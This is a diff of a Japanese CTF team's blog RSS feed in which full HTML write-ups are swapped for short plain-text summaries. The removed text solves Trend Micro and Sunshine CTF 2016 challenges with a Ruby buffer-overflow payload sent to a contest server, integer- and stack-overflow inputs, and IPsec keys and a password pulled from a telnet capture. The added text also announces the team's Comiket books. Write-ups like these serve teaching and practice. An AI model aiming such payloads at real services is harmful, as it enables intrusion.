-&lt;p&gt;この問題は巨大なJavaScriptから正解の鍵を得るというものです。
-まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var ko = &amp;quot;c33367701511b4f6020ec61ded352059&amp;quot;;
-
-var ka = &amp;quot;61636f697b57b5b7d389db0edb801fc3&amp;quot;;
-
-var kq = &amp;quot;d2172edf24129e06f3913376a12919a4&amp;quot;;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;c33367701511b4f6020ec61ded352059&lt;/code&gt; → &lt;code&gt;654321&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;61636f697b57b5b7d389db0edb801fc3&lt;/code&gt; → &lt;code&gt;qwerty&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;d2172edf24129e06f3913376a12919a4&lt;/code&gt; → &lt;code&gt;admin&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;そして次の処理でこれらの文字列を変数&lt;code&gt;nl&lt;/code&gt;に従って並び換えているということが分かります。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var c = &amp;quot;&amp;quot;, d = &amp;quot;&amp;quot;, e = &amp;quot;&amp;quot;;
-for (var f = 0; f &amp;lt; b.length; ) {
-    c += b[nl[++f]];
-    d += b[nl[++f]];
-    e += b[nl[++f]];
-}
-
-// ......中略......
-
-var nl = [ 0, 2, 1, 12, 7, 15, 5, 4, 8, 16, 17, 3, 9, 10, 14, 11, 13, 6, 0 ];
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;最終的にフラグは&lt;code&gt;TMCTF{q6r4dy5ei2na1twm3}&lt;/code&gt;でした。&lt;/p&gt;
-
-&lt;h1 id=&#34;analysis-offensive-200&#34;&gt;Analysis - Offensive 200&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Category: Analysis - offensive&lt;/p&gt;
-
-&lt;p&gt;Points: 200&lt;/p&gt;
-
-&lt;p&gt;This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.&lt;/p&gt;
-
-&lt;p&gt;The following code contains a bug that can be exploited to read back a flag:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int pwned;
-char buffer[1024];
-
-DWORD WINAPI CallBack(LPVOID lpParameter) {
-	pwned = 0;
-	ZeroMemory(buffer, 1024);
-	SOCKET *sock = (SOCKET *)lpParameter;
-	SOCKET _sock = *sock;
-	send(_sock, &amp;quot;Welcome&amp;quot;, 8, 0);
-	int ret = 0;
-	ret = recv(_sock, buffer, 1028, 0);
-	printf(&amp;quot;[x] RET: %d.\n&amp;quot;, ret);
-	printf(&amp;quot;[x] PWNED: 0x%x.\n&amp;quot;, pwned);
-	Sleep(1);
-	if (((pwned &amp;gt;&amp;gt; 16)&amp;amp;0xFFFF ^ 0xc0fe) == 0x7eaf &amp;amp;&amp;amp; (((pwned &amp;amp; 0xFFFF)^0x1a1a) == 0xdae4)) {
-
-			send(_sock, &amp;quot;PWNED&amp;quot;, 5, 0);
-			ReadAndReturn(L&amp;quot;key.txt&amp;quot;, _sock);
-			closesocket(_sock);
-			return 0;
-	}
-	else {
-		send(_sock, &amp;quot;GO AWAY&amp;quot;, 7, 0);
-		closesocket(_sock);
-	}
-
-	return 0;
- }
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Craft a packet that would return a valid flag. Good luck!&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;code&gt;buffer&lt;/code&gt;が1024バイトしか確保されていないにもかかわらず、11行目で &lt;code&gt;ret = recv(_sock, buffer, 1028, 0);&lt;/code&gt; と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。&lt;/p&gt;
-
-&lt;p&gt;なぜか &lt;code&gt;nc&lt;/code&gt; が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;require &#39;socket&#39;
-
-HOST = &#39;52.197.128.90&#39;
-port = (80..85).to_a.sample
-
-puts &amp;quot;connecting #{HOST}:#{port}&amp;quot;
-sock = TCPSocket.open(&#39;52.197.128.90&#39;, port)
-
-payload = &#39;a&#39; * 1024 + &amp;quot;\xfe\xc0\x51\xbe&amp;quot;
-
-sock.read(8)
-sock.send(payload, 0)
-while r = sock.gets
-  puts r
-end
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;そして正解をメモし忘れた 😇&lt;/p&gt;
-
-&lt;h1 id=&#34;misc-100&#34;&gt;Misc 100&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Category: Misc(iot and network)&lt;/p&gt;
-
-&lt;p&gt;Points: 100&lt;/p&gt;
-
-&lt;p&gt;Please analyze this pcap.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;pcapファイルが渡される。中身を見ると、IPsecな通信と、普通にtelnetしている通信がある。&lt;/p&gt;
-
-&lt;p&gt;Wiresharkでtelnetでのやりとりをテキストとして見ると、 &lt;code&gt;ip xfrm state&lt;/code&gt;を叩いている箇所がある。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;.]0;reds@localhost:~.[reds@localhost ~]$ sudo ip xfrm state
-.sudo ip xfrm state
-[sudo] password for reds: ynwa
-.
-src 1.1.1.11 dst 1.1.1.10
-	proto esp spi 0xfab21777 reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x11cf27c5b3357a5fd5d26d253fffd5339a99b4d1
-	enc cbc(aes) 0xfa19ff5565b1666d3dd16fcfda62820da44b2b51672a85fed155521bedb243ee
-src 1.1.1.10 dst 1.1.1.11
-	proto esp spi 0xbfd6dc1c reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x829b457814bd8856e51cce1d745619507ca1b257
-	enc cbc(aes) 0x2a340c090abec9186c841017714a233fba6144b3cb20c898db4a30f02b0a003d
-src 1.1.1.10 dst 1.1.1.11
-	proto esp spi 0xeea1503c reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x951d2d93498d2e7479c28c1bcc203ace34d7fcde
-	enc cbc(aes) 0x6ec6072dd25a6bcb7b9b3b516529acb641a1b356999f791eb971e57cc934a5eb
-src 1.1.1.11 dst 1.1.1.10
-	proto esp spi 0xd4d2074d reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x100a0b23fc006c867455506843cc96ad26026ec0
-	enc cbc(aes) 0xdcfbc7d33d3c606de488c6efac4624ed50b550c88be0d62befb049992972cca6
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に &lt;code&gt;flag.png&lt;/code&gt; というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。&lt;/p&gt;
-
-&lt;h1 id=&#34;misc-200&#34;&gt;Misc 200&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Category: Misc(iot and network)&lt;/p&gt;
-
-&lt;p&gt;Points: 200&lt;/p&gt;
-
-&lt;p&gt;find all LTE bands this phone supported.&lt;/p&gt;
-
-&lt;p&gt;the final answer will be from small to big, and use &amp;lsquo;,&amp;rsquo; to seperate without spaces.&lt;/p&gt;
-
-&lt;p&gt;example&amp;gt; if the answer is band 1 and 2 and 3, the key should be: &amp;ldquo;TMCTF{1,2,3}&amp;rdquo;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;code&gt;ModemSettings.txt&lt;/code&gt; というファイルが与えられ、そこからその携帯電話の対応しているLTEバンドを答える。&lt;/p&gt;
-
-&lt;p&gt;この &lt;code&gt;ModemSettings.txt&lt;/code&gt; はどうやら NV-items_reader_writerというソフトウェアによる出力らしい。&lt;/p&gt;
-
-&lt;p&gt;LTEのバンドに関する設定は&amp;rdquo;6828&amp;rdquo;番にあるという。該当する箇所を引用する。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;6828 (0x1AAC)   -   OK
-FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。&lt;/p&gt;
-
-&lt;p&gt;寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;i=0; puts (0x031F1DFF).to_s(2).reverse.split(//).map { |c| i +=1; [c, i] }.select { |x| x[0] == &#39;1&#39; }.map { |x| x[1] }.join(&#39;,&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+      <description>日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われたTrend Micro CTF 2016のwrite-upです。
+urandomは4問解答し600点、92位でした。
+Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。
+Analysis - Offensive 100  Category: Analysis/Offensive
+Points: 100
+Please enter key. Key is TMCTF flag.
+Download the file Decrypt the downloaded file by the following command.
+openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip
+unzip files1.zip
+ この問題は巨大なJavaScriptから正解の鍵を得るというものです。 まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。
+var ko = &amp;quot;c33367701511b4f6020ec61ded352059&amp;quot;; var ka = &amp;quot;61636f697b57b5b7d389db0edb801fc3&amp;quot;; var kq = &amp;quot;d2172edf24129e06f3913376a12919a4&amp;quot;;  これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</description>
     </item>
     
     <item>
@@ -584,23 +168,9 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
       <pubDate>Thu, 11 Aug 2016 00:47:15 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c90-sample/</guid>
-      <description>&lt;p&gt;&lt;a href=&#34;//blog.urandom.team/pdfs/c90_sample.pdf&#34;&gt;&lt;img src=&#34;//blog.urandom.team/images/c90_cover_thumb.png&#34; alt=&#34;C90 Sample&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;CTFサークルurandomは、コミックマーケット90で新刊「urandom vol.2」を頒布します。
-スペースは&lt;strong&gt;3日目 東4ホール ム-43b&lt;/strong&gt;です。
-記事は以下の2本で、42P 300円で頒布します。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;バイナリの調べ方 (by op)&lt;/li&gt;
-&lt;li&gt;Mental Game! (by yyu)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;表紙デザインはpolamjagです。
-それぞれの記事から2Pずつ抜粋した&lt;a href=&#34;//blog.urandom.team/pdfs/c90_sample.pdf&#34;&gt;サンプル&lt;/a&gt;を公開します。&lt;/p&gt;
-
-&lt;p&gt;また、この新刊のおまけとして&lt;strong&gt;DEF CON CTF 2016 Final参戦記&lt;/strong&gt;をコピ本で頒布予定です。
-8/5-7にアメリカ ラスベガスで開催されたDEF CON CTF 2016 Finalについて、opがCTFチームbinjaのメンバーとして参加した経験を記したもので、現在執筆中です(こちらはurandomとは関係ありません)。&lt;/p&gt;
-</description>
+      <description>CTFサークルurandomは、コミックマーケット90で新刊「urandom vol.2」を頒布します。 スペースは3日目 東4ホール ム-43bです。 記事は以下の2本で、42P 300円で頒布します。
+ バイナリの調べ方 (by op) Mental Game! (by yyu)  表紙デザインはpolamjagです。 それぞれの記事から2Pずつ抜粋したサンプルを公開します。
+また、この新刊のおまけとしてDEF CON CTF 2016 Final参戦記をコピ本で頒布予定です。 8/5-7にアメリカ ラスベガスで開催されたDEF CON CTF 2016 Finalについて、opがCTFチームbinjaのメンバーとして参加した経験を記したもので、現在執筆中です(こちらはurandomとは関係ありません)。</description>
     </item>
     
     <item>
@@ -609,28 +179,10 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
       <pubDate>Wed, 20 Jul 2016 00:57:00 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c90-announce/</guid>
-      <description>&lt;p&gt;C90（2016年夏コミ）当選してました。スペースは &lt;strong&gt;3日目 東ム-43b&lt;/strong&gt; です。C89に引き続き、&amp;rdquo;urandom vol.2&amp;rdquo;を出します。内容は引き続いてないです。&lt;/p&gt;
-
-&lt;p&gt;urandom vol.2はこんな感じの内容になります。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;バイナリの調べ方 (by op)&lt;/li&gt;
-&lt;li&gt;Mental Game! (by yyu)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;この内容で入稿を完了しています。後ほどサンプルをアップロードします。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;ul&gt;
-&lt;li&gt;（2016-07-20 修正）
-
-&lt;ul&gt;
-&lt;li&gt;諸般の事情により『.NET難読化ツール事始め』(fetastein)に代わって、『Mental Game!』(yyu)となりました&lt;/li&gt;
-&lt;li&gt;入稿完了したよ！！！！&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
+      <description>C90（2016年夏コミ）当選してました。スペースは 3日目 東ム-43b です。C89に引き続き、&amp;rdquo;urandom vol.2&amp;rdquo;を出します。内容は引き続いてないです。
+urandom vol.2はこんな感じの内容になります。
+ バイナリの調べ方 (by op) Mental Game! (by yyu)  この内容で入稿を完了しています。後ほどサンプルをアップロードします。
+ （2016-07-20 修正）  諸般の事情により『.NET難読化ツール事始め』(fetastein)に代わって、『Mental Game!』(yyu)となりました 入稿完了したよ！！！！   </description>
     </item>
     
     <item>
@@ -639,187 +191,17 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
       <pubDate>Tue, 15 Mar 2016 01:42:29 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/sunshine-ctf-2016/</guid>
-      <description>
-
-&lt;p&gt;2016-03-13 01:00 - 2016-03-14 05:00 (JST)に開催された&lt;a href=&#34;http://ctf.bsidesorlando.org/&#34;&gt;Sunshine CTF 2016&lt;/a&gt;のwrite-upです。&lt;/p&gt;
-
-&lt;p&gt;なお、今回は以下のメンバー編成で参加しました。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;mayth （土曜日を寝て潰す担当）&lt;/li&gt;
-&lt;li&gt;op （たまに現れていくらかの助言と違法語句を残して去って行く担当）&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;ESTはクソ。&lt;/p&gt;
-
-&lt;h1 id=&#34;forensics-50-butterfly-effect&#34;&gt;Forensics 50: Butterfly Effect&lt;/h1&gt;
-
-&lt;p&gt;&lt;code&gt;butterfly.png&lt;/code&gt;が与えられる。&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www1.chapman.edu/~nabav100/ImgStegano/&#34;&gt;ImgStegano&lt;/a&gt;にファイルを読み込ませて&amp;rdquo;Image &amp;gt; Enhanced LSB&amp;rdquo;とするとフラグが現れた。&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;sun{RE4DY_THE_4CID_M4GNET!}&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&#34;exploitation-50-alligatorsim95&#34;&gt;Exploitation 50: alligatorsim95&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Don&amp;rsquo;t try to automate adding X eggs at a time&lt;/p&gt;
-
-&lt;p&gt;legends circulate in florida of an alligator that had laid millions of eggs. use this simulator to try to achieve the same greatness&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;※プログラムは与えられない。&lt;/p&gt;
-
-&lt;p&gt;指定されたIPアドレス/ポートにncで接続すると、アリゲーターのAAと共に文章が流れてくる。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;-&amp;gt; u r... AN ALLIGATOR!!
-.. simulating alligator lifecycle ..
-.. simulating alligator throwing physics..
--&amp;gt; you got 1337 eggz in ur nest, how many you gonna lay alligator??
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;この後に整数値を入力すると、その数だけ卵の数（上記の通り初期値1337）が増える。ただし上限は50。それを超えると拒否され再度同様のプロンプトが現れる。接続を切られるのは以下の通り。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;echo&lt;/code&gt;とかで入力を機械的に流し込もうとしたとき (&amp;ldquo;Don&amp;rsquo;t try to automate adding X eggs at a time&amp;rdquo;)&lt;/li&gt;
-&lt;li&gt;0や数字として解釈出来ない数を与えたとき&lt;/li&gt;
-&lt;li&gt;一定時間が経過したとき&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;この条件下で卵の数を大きくする問題。&lt;/p&gt;
-
-&lt;p&gt;色々入力を試すと、0はダメだが負数を受け付けること、また、負数であれば絶対値がいくら大きくてもよいことがわかった。
-これを利用すると整数オーバーフローを引き起こすことができる。そうすると卵の数は非常に大きな値となり、フラグを得ることができる。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;-&amp;gt; u r... AN ALLIGATOR!!
-.. simulating alligator lifecycle ..
-.. simulating alligator throwing physics..
--&amp;gt; you got 1337 eggz in ur nest, how many you gonna lay alligator?? -2147483647
-~~ producing eggz ~~
-.. simulating alligator lifecycle ..
-.. simulating alligator throwing physics..
--&amp;gt; you got -2147482310 eggz in ur nest, how many you gonna lay alligator?? -10
-~~ producing eggz ~~
-.. simulating alligator lifecycle ..
-.. simulating alligator throwing physics..
--&amp;gt; you got -2147482320 eggz in ur nest, how many you gonna lay alligator?? -40000
-~~ producing eggz ~~
--&amp;gt; dang 2147444976 is a lotta eggs
--&amp;gt; as a god among gators here is ur crown:
-sun{int_0verflow_i5_a_g0od_st4rt}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;sun{int_0verflow_i5_a_g0od_st4rt}&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&#34;exploitation-55-dance&#34;&gt;Exploitation 55: Dance&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Some prefer the stanky leg, others prefer the dab, but what dance moves do you have?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;IPアドレスとポート番号が指定される。当初プログラムは与えられなかったが、後にフラグ部分を潰したバイナリが配布された。&lt;/p&gt;
-
-&lt;p&gt;サーバーに接続すると以下のような文字が流れてくる。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
-give us ur sick dance moves like so:
-whip,naenae,whip,whip,naenae&amp;lt;ENTER&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;whip&lt;/code&gt;か&lt;code&gt;naenae&lt;/code&gt;をカンマ区切りで並べて送信すると&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;do the naenae
-(\)
-  \(:O)
-   /||\_
-_/¯    ¯\_
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;こんな感じで対応したアクションと愉快なAAが流れてくる。&lt;/p&gt;
-
-&lt;p&gt;当初何をさせたいのかさっぱりわからなかったが、バイナリが配布されたのでそれを読んだ。&lt;/p&gt;
-
-&lt;p&gt;その結果、こちらからの入力を受け取るバッファについて、&lt;code&gt;memset&lt;/code&gt;で80bytesを&lt;code&gt;NULL&lt;/code&gt;で初期化しているにも関わらず、&lt;code&gt;fgets&lt;/code&gt;で最大89bytesまで読み込むようになっていることがわかった。また、0で初期化された特定の変数の値が書き換わっているときにフラグが表示されるようになっていることがわかった。&lt;/p&gt;
-
-&lt;p&gt;入力の読み込みはだいたい次のようなロジックになっている。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;while (strlen(buf) &amp;gt; 0) {
-  if (*buf == &#39;n&#39;) {
-    buf += 7;
-    donaenae();
-  } else if (*buf == &#39;w&#39;) {
-    buf += 5;
-    dowhip();
-  }
-}
-check_flag();
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;先頭しか見てないっぽいので適当に80文字の&amp;rdquo;n&amp;rdquo;を送り付けたところ、フラグが得られた。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% ruby -e &#39;puts &amp;quot;n&amp;quot; * 0x50&#39; | nc ****
-welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
-give us ur sick dance moves like so:
-whip,naenae,whip,whip,naenae&amp;lt;ENTER&amp;gt;
-do the naenae
-(\)
-  \(:O)
-   /||\_
-_/¯    ¯\_
-(snip)
-do the naenae
-(\)
-  \(:O)
-   /||\_
-_/¯    ¯\_
-girl u can dance w the best of em. the pw to our vip lounge is: sun{d4nc3_0n_th3_s7ack}
-
-cool dance! come again!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;sun{d4nc3_0n_th3_s7ack}&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&#34;misc-50-find-floridaman&#34;&gt;Misc 50: Find Floridaman&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;In other news&amp;hellip; Floridaman did what with an alligator?&lt;/p&gt;
-
-&lt;p&gt;Remember, this has the normal flag format.&lt;/p&gt;
-
-&lt;p&gt;Hint: You need only look at comments from Florida-based news websites.&lt;/p&gt;
-
-&lt;p&gt;Hint: Gator went threw a window!&lt;/p&gt;
-
-&lt;p&gt;Hint: &amp;ldquo;Flori-duh&amp;rdquo;&lt;/p&gt;
-
-&lt;p&gt;NOTE: Flag was posted before the 12th&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;フロリダマンを探すマン。&lt;/p&gt;
-
-&lt;p&gt;問題オープン当初は最初の2文だけだったのが、誰も解かないからか次々にヒントが追加されて結局ヒントが3つになった。&lt;/p&gt;
-
-&lt;p&gt;ヒントが3つになってから、そのヒントを元に&amp;rdquo;Flori-duh Alligator&amp;rdquo;で探してみると、次の記事が見つかった。&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www.mypalmbeachpost.com/news/news/crime-law/wendys-alligator-thrower-is-only-fulfilling-his-fl/nqNfr/&#34;&gt;Wendy’s alligator-thrower is only fulfilling his Flori-duh destiny&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;この記事のReader Commentsにフラグがある。&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Summerc137 3 days ago
-May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s_th1s_even_real_l1fe?}&lt;/p&gt;
-
-&lt;p&gt;sun{1s_th1s_even_real_l1fe?}&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;ちなみにこの事件、なんでも1mちょっとあるアリゲーターをWendy&amp;rsquo;sのドライブスルーの窓から投げ込んだのだそうな。さすがアメリカ。&lt;/p&gt;
-</description>
+      <description>2016-03-13 01:00 - 2016-03-14 05:00 (JST)に開催されたSunshine CTF 2016のwrite-upです。
+なお、今回は以下のメンバー編成で参加しました。
+ mayth （土曜日を寝て潰す担当） op （たまに現れていくらかの助言と違法語句を残して去って行く担当）  ESTはクソ。
+Forensics 50: Butterfly Effect butterfly.pngが与えられる。
+ImgSteganoにファイルを読み込ませて&amp;rdquo;Image &amp;gt; Enhanced LSB&amp;rdquo;とするとフラグが現れた。
+ sun{RE4DY_THE_4CID_M4GNET!}
+ Exploitation 50: alligatorsim95  Don&amp;rsquo;t try to automate adding X eggs at a time
+legends circulate in florida of an alligator that had laid millions of eggs. use this simulator to try to achieve the same greatness
+ ※プログラムは与えられない。
+指定されたIPアドレス/ポートにncで接続すると、アリゲーターのAAと共に文章が流れてくる。
+-&amp;gt; u r.</description>
     </item>
     
     <item>
@@ -828,21 +210,10 @@ May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s
       <pubDate>Sun, 21 Feb 2016 17:42:38 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c89-digital-book/</guid>
-      <description>
-
-&lt;p&gt;大変長らくお待たせしました。urandom vol.1の電子書籍版をリリースしました。電子書籍版は&lt;strong&gt;256円&lt;/strong&gt;での販売です。内容は物理書籍版と同一です。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://gumroad.com/l/xgnF/&#34;&gt;販売ページはこちら&lt;/a&gt;&lt;/strong&gt;です（Gumroadに移動します）。決済にはクレジットカードかPayPalが使えます。&lt;/p&gt;
-
-&lt;h2 id=&#34;物理書籍を購入した方へ&#34;&gt;物理書籍を購入した方へ&lt;/h2&gt;
-
-&lt;p&gt;購入ページに&amp;rdquo;Offer code&amp;rdquo;という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;コードを使用する場合、クレジットカード情報は不要です（正しいコードを入力すると入力欄が非表示になります）。&lt;/li&gt;
-&lt;li&gt;同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。&lt;/li&gt;
-&lt;/ul&gt;
-</description>
+      <description> 大変長らくお待たせしました。urandom vol.1の電子書籍版をリリースしました。電子書籍版は256円での販売です。内容は物理書籍版と同一です。
+販売ページはこちらです（Gumroadに移動します）。決済にはクレジットカードかPayPalが使えます。
+物理書籍を購入した方へ 購入ページに&amp;rdquo;Offer code&amp;rdquo;という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。
+ コードを使用する場合、クレジットカード情報は不要です（正しいコードを入力すると入力欄が非表示になります）。 同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。  </description>
     </item>
     
     <item>
@@ -851,21 +222,11 @@ May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s
       <pubDate>Tue, 29 Dec 2015 20:23:43 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c89-idapython/</guid>
-      <description>&lt;p&gt;&lt;a href=&#34;//blog.urandom.team/post/c89-pre/&#34;&gt;先の記事&lt;/a&gt;で述べている通り、CTFチームurandomとしてコミックマーケット89で同人誌「urandom vol.1」を頒布します（入稿間に合った）。&lt;/p&gt;
+      <description>先の記事で述べている通り、CTFチームurandomとしてコミックマーケット89で同人誌「urandom vol.1」を頒布します（入稿間に合った）。
+その同人誌にIDA Pythonの記事を書きました。タイトルは「Easy Recipes for IDA Python」。本全体で三章構成になっている内の一章です。 内容は、タイトルの通りIDA Pythonのための簡単レシピ的なものになっています。 IDAによる解析作業中に起こりそうな問題ケースを3つ挙げ、それらを解決する比較的簡単なIDA Pythonスクリプトの例とその解説を書いています。
+こんなん。
 
-&lt;p&gt;その同人誌にIDA Pythonの記事を書きました。タイトルは「Easy Recipes for IDA Python」。本全体で三章構成になっている内の一章です。
-内容は、タイトルの通り&lt;strong&gt;IDA Pythonのための簡単レシピ&lt;/strong&gt;的なものになっています。
-IDAによる解析作業中に起こりそうな問題ケースを3つ挙げ、それらを解決する比較的簡単なIDA Pythonスクリプトの例とその解説を書いています。&lt;/p&gt;
-
-&lt;p&gt;こんなん。&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;//blog.urandom.team/images/c89_idapython_p13-14.png&#34;&gt;&lt;img src=&#34;//blog.urandom.team/images/c89_idapython_p13-14.png&#34; alt=&#34;Easy Recipes for IDA Python&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;C89 3日目(15/12/31) 東ホ-05b&lt;/strong&gt; 500円です。
-2016年2月以降に電子書籍化する予定（詳細未定）ですが、物理本の購入者には電子書籍版を無料で提供します。&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;//blog.urandom.team/images/c89_cover_sm.png&#34;&gt;&lt;img src=&#34;//blog.urandom.team/images/c89_cover_thumb.png&#34; alt=&#34;urandom vol.1 表紙&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-</description>
+C89 3日目(15/12/31) 東ホ-05b 500円です。 2016年2月以降に電子書籍化する予定（詳細未定）ですが、物理本の購入者には電子書籍版を無料で提供します。</description>
     </item>
     
     <item>
@@ -874,28 +235,60 @@ IDAによる解析作業中に起こりそうな問題ケースを3つ挙げ、�
       <pubDate>Tue, 29 Dec 2015 16:01:01 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c89-decompiler/</guid>
-      <description>&lt;p&gt;いよいよ明日がコミケ初日ですよ！&lt;/p&gt;
